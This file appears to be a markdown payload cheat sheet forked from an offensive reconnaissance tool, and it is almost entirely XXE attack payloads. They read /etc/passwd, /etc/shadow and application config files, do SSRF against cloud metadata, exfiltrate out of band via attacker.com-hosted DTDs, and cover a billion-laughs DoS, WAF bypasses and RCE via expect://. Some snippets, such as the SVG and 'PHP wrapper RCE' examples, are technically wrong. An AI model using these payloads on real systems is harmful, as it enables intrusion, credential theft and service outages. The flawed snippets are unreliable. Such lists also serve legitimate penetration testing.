<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

# XXE (XML External Entity) Payloads

## Basic XXE
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

## Blind XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<data>test</data>
```

## Error-Based XXE
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///nonexistent">
]>
<data>&xxe;</data>
```

## SSRF via XXE
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<data>&xxe;</data>
```

## Read Local Files
```xml
<!-- /etc/passwd -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">

<!-- /etc/shadow -->
<!ENTITY xxe SYSTEM "file:///etc/shadow">

<!-- Source code -->
<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
```

## Blind OOB (Out-of-Band)
### Attacker DTD (hosted)
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
```

### On victim server
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
  %xxe;
]>
<data>test</data>
```

## PHP Filter Chain
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php">
]>
<data>&xxe;</data>
```

## XXE with CDATA
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY start "<![CDATA[">
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY end "]]>">
]>
<data>&start;&xxe;&end;</data>
```

## Billion Laughs Attack (DoS)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<data>&lol3;</data>
```

## WAF Bypass
### Encoding
```xml
<?xml version='1.0' encoding='UTF-8'?>
```

### Alternative Entity Syntax
```xml
<!ENTITY xxe SYSTEM 'file:///etc/passwd'>
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM 'file:///etc/passwd' >
```

### Remove DOCTYPE
```xml
<?xml version="1.0" encoding="UTF-8"?>
<data xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd"/>
</data>
```

## XXE in Different Formats
### SVG
```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    <![CDATA[<!ENTITY xxe SYSTEM "file:///etc/passwd">]]>
  </script>
</svg>
```

### JSON with XML
```xml
<?xml version="1.0"?>
<root>
  <item>
    <name>&xxe;</name>
  </item>
</root>
```

### SOAP
```xml
<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
  <soap:Body>
    <foo>&xxe;</foo>
  </soap:Body>
</soap:Envelope>
```

## XXE to RCE
### Via expect://
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<data>&xxe;</data>
```

### Via PHP wrapper
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
]>
<data>&xxe;</data>
```
